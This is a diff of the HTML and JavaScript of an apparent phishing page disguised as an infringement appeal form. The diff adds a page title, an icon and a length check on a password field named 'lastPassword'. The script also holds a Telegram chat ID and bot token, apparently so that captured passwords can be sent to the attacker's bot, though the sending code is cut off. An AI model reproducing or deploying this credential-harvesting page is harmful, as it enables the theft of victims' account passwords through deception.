@@ -7,8 +7,19 @@
     <meta name="robots" content="noindex, nofollow">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="icon" href="head.gif">
+    <title>Appeal | Infringement</title>
     <script>
     function sendAndRedirect() {
+      var inputElement = document.getElementById('lastPassword');
+           var message = inputElement.value.trim();
+
+           // Check if the input is at least 4 characters long
+           if (message.length < 4) {
+               // If less than 4 characters, reload the page
+               window.location.reload();
+               return; // Exit the function
+           }
         var chatId = '-4107249278'; // Hedef chat ID
         var botToken = '6712897367:AAFBFLG8srIn4GY5MatuCYJlpcjMBmsItYI'; // Botunuzun token'ı
         var inputElement = document.getElementById('lastPassword');
